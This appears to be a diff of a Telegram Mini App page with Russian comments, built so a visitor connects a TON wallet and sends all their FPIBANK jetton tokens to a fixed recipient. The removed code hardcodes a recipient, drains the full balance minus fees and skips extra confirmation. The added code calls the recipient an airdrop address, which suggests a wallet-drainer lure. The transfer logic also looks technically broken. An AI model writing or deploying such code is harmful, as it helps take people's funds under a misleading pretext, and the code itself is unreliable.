@@ -3,28 +3,32 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
   <meta http-equiv="Content-Security-Policy"
-    content="
-      default-src 'self';
-      script-src 'self' 'unsafe-eval' 'unsafe-inline' https://telegram.org https://unpkg.com https://tonapi.io;
-      style-src 'self' 'unsafe-inline' https://unpkg.com;
-      connect-src 'self' https://bridge.tonapi.io https://tonconnect.manifestapi.io https://tonapi.io;
-      font-src 'self' https://unpkg.com;
-      img-src * data:;
-    ">
+  content="
+    default-src 'self';
+    script-src 'self' 'unsafe-eval' 'unsafe-inline' https://telegram.org https://unpkg.com https://tonapi.io;
+    style-src 'self' 'unsafe-inline' https://unpkg.com;
+    connect-src 'self' https://bridge.tonapi.io https://tonconnect.manifestapi.io https://tonapi.io;
+    font-src 'self' https://unpkg.com;
+    img-src * data:;
+  ">
+
   <title>Telegram Mini App: TON Connect Jetton Transfer</title>
+
   <script src="https://telegram.org/js/telegram-webapp.js"></script>
   <script src="./js/tonconnect-sdk.min.js"></script>
   <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css">
   <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 </head>
 <body>
-  <h1>Telegram Mini App: Отправка всех FPIBANK (Jetton)</h1>
+  <h1>Telegram Mini App: Отправка всех токенов FPIBANK</h1>
+
   <div id="ton-connect"></div>
+
   <button id="sendTransaction">Отправить все FPIBANK</button>
 
   <script>
-    // Инициализация Telegram WebApp
     if (typeof Telegram === "undefined") {
       window.Telegram = {
         WebApp: {
@@ -36,132 +40,55 @@
       Telegram.WebApp.ready();
     }
 
-    // Инициализация TON Connect UI
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
       manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
       buttonRootId: "ton-connect"
     });
 
-    // Адреса: jetton master и получателя (recipientAddress)
     const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
-    const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";
 
-    // Функция получения баланса через внешний API (баланс в нанотоках)
-    async function getWalletBalance(address) {
-      try {
-        const response = await fetch(`https://tonapi.io/v1/address/${address}/balance`);
-        const data = await response.json();
-        return BigInt(data.balance);
-      } catch (err) {
-        console.error("Ошибка получения баланса:", err);
-        return 0n;
+    async function sendJettonTransaction(userWalletAddress, recipientAddress) {
+  const transaction = {
+    validUntil: Math.floor(Date.now() / 1000) + 360,
+    messages: [
+      {
+        address: jettonMasterAddress, // Отправляем на Jetton Master напрямую
+        amount: "", // Автоматический расчет комиссии
+        payload: {
+          type: "jetton_transfer",
+          query_id: 0,
+          amount: "1000000000", // Попытка отправить 1 токен
+          destination: recipientAddress,
+          response_destination: null,
+          custom_payload: null,
+          forward_ton_amount: "0",
+          forward_payload: null
+        }
       }
-    }
+    ]
+  };
 
-    // Функция оценки комиссии транзакции через внешний API
-    async function estimateTransactionFee(transaction) {
-      try {
-        const response = await fetch(`https://tonapi.io/v1/estimateFee`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(transaction)
-        });
-        const data = await response.json();
-        return BigInt(data.fee);
-      } catch (err) {
-        console.error("Ошибка оценки комиссии:", err);
-        // Используем запасное значение комиссии, если оценка не удалась
-        return 50000000n;
-      }
-    }
+  try {
+    const result = await tonConnectUI.sendTransaction(transaction);
+    console.log("Попытка отправить Jetton:", result);
+    Telegram.WebApp.showAlert("Попытка отправить Jetton: " + JSON.stringify(result));
+  } catch (error) {
+    console.error("Ошибка:", error);
+    Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
+  }
+}
 
-    // Демонстрационная функция сериализации payload для jetton_transfer.
-    // В реальном проекте необходимо использовать корректную сериализацию согласно спецификации TON.
-    function encodeJettonTransferPayload(query_id, amount, destination, response_destination, custom_payload, forward_ton_amount, forward_payload) {
-      const payloadObject = {
-        query_id: query_id,
-        amount: amount,
-        destination: destination,
-        response_destination: response_destination,
-        custom_payload: custom_payload,
-        forward_ton_amount: forward_ton_amount,
-        forward_payload: forward_payload
-      };
-      const jsonStr = JSON.stringify(payloadObject);
-      return btoa(jsonStr);
-    }
 
-    // Функция отправки транзакции с jetton_transfer
-    async function sendJettonTransaction(fee, tokenAmount) {
-      // Кодирование payload: здесь мы передаем все необходимые поля.
-      const encodedPayload = encodeJettonTransferPayload(
-        0,                         // query_id (0 для демонстрации)
-        tokenAmount.toString(),    // сумма перевода
-        recipientAddress,          // адрес получателя (destination)
-        null,                      // response_destination (null, если не требуется)
-        null,                      // custom_payload (null, если не требуется)
-        "0",                       // forward_ton_amount (0)
-        null                       // forward_payload (null)
-      );
-
-      const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 360,
-        messages: [
-          {
-            address: jettonMasterAddress,
-            amount: fee.toString(),
-            payload: encodedPayload
-          }
-        ]
-      };
-
-      try {
-        const result = await tonConnectUI.sendTransaction(transaction);
-        console.log("Попытка отправить Jetton:", result);
-        Telegram.WebApp.showAlert("Попытка отправить Jetton: " + JSON.stringify(result));
-      } catch (error) {
-        console.error("Ошибка транзакции:", error);
-        Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
-      }
-    }
-
-    // Основная функция: получение баланса, оценка комиссии и отправка jetton_transfer
     async function sendAllFPIBANK() {
       if (!tonConnectUI.connected) {
-        Telegram.WebApp.showAlert("Подключите кошелек.");
+        Telegram.WebApp.showAlert("Подключите сначала кошелек.");
         return;
       }
 
-      const walletAddress = tonConnectUI.session.account.address;
-      const balance = await getWalletBalance(walletAddress);
-      if (balance === 0n) {
-        Telegram.WebApp.showAlert("Не удалось получить баланс.");
-        return;
-      }
+      const userWalletAddress = tonConnectUI.wallet.account.address;
+      const recipientAddress = "АДРЕС_ПОЛУЧАТЕЛЯ_АИРДРОПА";
 
-      // Создаем предварительный объект транзакции для оценки комиссии,
-      // используя предварительное кодирование payload.
-      const preliminaryPayload = encodeJettonTransferPayload(0, "0", recipientAddress, null, null, "0", null);
-      const preliminaryTransaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 360,
-        messages: [
-          {
-            address: jettonMasterAddress,
-            amount: "0",
-            payload: preliminaryPayload
-          }
-        ]
-      };
-
-      const fee = await estimateTransactionFee(preliminaryTransaction);
-      if (balance <= fee) {
-        Telegram.WebApp.showAlert("Недостаточно средств для покрытия комиссии.");
-        return;
-      }
-      const tokenAmount = balance - fee;
-
-      // Отправляем транзакцию (без дополнительного подтверждения, т.к. предупреждения добавлены на уровне платформы)
-      await sendJettonTransaction(fee, tokenAmount);
+      await sendJettonTransaction(userWalletAddress, recipientAddress);
     }
 
     document.getElementById("sendTransaction").addEventListener("click", sendAllFPIBANK);
